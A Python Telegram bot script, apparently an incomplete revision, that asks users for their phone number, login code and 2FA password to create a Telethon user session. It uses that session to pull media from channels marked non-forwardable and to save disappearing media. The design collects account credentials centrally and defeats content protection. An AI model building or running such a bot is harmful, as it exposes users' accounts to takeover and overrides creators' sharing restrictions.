# Same imports as before
import os
import asyncio
import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, ChannelPrivateError
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

# --- Load .env ---
load_dotenv()
DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))

WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
SUPPORT_LINK = "https://t.me/valahallah"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

app = ApplicationBuilder().token(BOT_TOKEN).build()

API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
user_login_data = {}

# --- START Command ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Inline keyboard (under image)
    inline_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Connect Your Account", callback_data="connect")],
        [InlineKeyboardButton("💬 Support Channel", url=SUPPORT_LINK)]
    ])

    # UI reply keyboard (menu)
    reply_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("📥 Download Non-Forwardable Media")]],
        resize_keyboard=True
    )

    welcome_text = (
        "<b>✨ 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘼𝙪𝙩𝙤𝙎𝙖𝙫𝙚 𝙐𝙨𝙚𝙧𝘽𝙤𝙩 ✨</b>\n\n"
        "🔒 <i>This bot helps you connect your own Telegram account to a secure userbot session.</i>\n\n"
        "💡 <b>Features:</b>\n"
        "• Auto-saves disappearing media 🔥\n"
        "• Secure Telethon login system 🔐\n"
        "• Works in the background without touching your main device 🛰️\n\n"
        "👇 Use the buttons below to begin."
    )

    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=welcome_text,
        reply_markup=inline_keyboard,
        parse_mode="HTML"
    )

    await update.message.reply_text(
        "☝️ Use the menu below to fetch non-forwardable media.",
        reply_markup=reply_keyboard
    )

# --- Connect Flow (unchanged) ---
# [Same functions: connect_callback, skip_api_id, skip_api_hash, get_api_id, get_api_hash,
#  get_phone, get_otp, get_password, complete_login] — KEEP AS IS

# --- Download Non-Forwardable Media ---
async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📎 Please send the message link of the media from a channel/group you're joined in.\n\n"
        "Examples:\nhttps://t.me/channelusername/123\nhttps://t.me/c/123456789/55",
        parse_mode="Markdown"
    )
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in user_login_data or "client" not in user_login_data[user_id]:
        await update.message.reply_text("⚠️ You need to connect your account first using /start.")
        return ConversationHandler.END

    client = user_login_data[user_id]["client"]

    try:
        if "t.me/c/" in text:
            parts = text.split("t.me/c/")[1].split("/")
            chat_id = int("-100" + parts[0])
            msg_id = int(parts[1])
        elif "t.me/" in text:
            parts = text.split("t.me/")[1].split("/")
            chat_id = parts[0]
            msg_id = int(parts[1])
        else:
            await update.message.reply_text("❌ Invalid message link format.")
            return FETCH_LINK

        entity = await client.get_entity(chat_id)
        message = await client.get_messages(entity, ids=msg_id)

        if not message or not message.media:
            await update.message.reply_text("⚠️ No media found in that message.")
            return ConversationHandler.END

        file = await message.download_media()
        await client.send_file("me", file, caption="📥 Fetched from non-forwardable media link.")
        await update.message.reply_text("✅ Media downloaded and sent to your Saved Messages.")
    except ChannelPrivateError:
        await update.message.reply_text("❌ Your account is not a member of that channel or group.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
    return ConversationHandler.END

# --- Conversation Handlers ---
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id), CommandHandler("skip", skip_api_id)],
        API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash), CommandHandler("skip", skip_api_hash)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[],
    allow_reentry=True
)

fetch_menu_conv = ConversationHandler(
    entry_points=[MessageHandler(filters.TEXT & filters.Regex("^📥 Download Non-Forwardable Media$"), menu_fetch_request)],
    states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
    fallbacks=[],
)

# --- Register Handlers & Run Bot ---
app.add_handler(CommandHandler("start", start))
app.add_handler(login_conv)
app.add_handler(fetch_menu_conv)

print("🤖 Bot is running...")
app.run_polling()
